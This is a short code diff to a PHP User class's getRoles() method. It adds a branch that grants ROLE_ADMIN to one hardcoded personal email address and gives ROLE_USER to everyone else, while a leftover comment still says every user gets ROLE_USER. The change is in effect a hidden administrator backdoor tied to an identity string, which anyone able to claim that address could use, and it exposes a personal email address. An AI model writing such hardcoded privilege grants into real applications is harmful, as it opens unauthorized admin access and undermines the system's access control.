@@ -174,7 +174,13 @@ class User implements UserInterface
     {
         $roles = $this->roles;
         // guarantee every user at least has ROLE_USER
-        $roles[] = 'ROLE_USER';
+
+        if ($this->getEmail() == "gauthier.michon@yahoo.fr") {
+            $roles[] = 'ROLE_ADMIN';
+        }
+        else {
+            $roles[] = 'ROLE_USER';
+        }
 
         return array_unique($roles);
     }
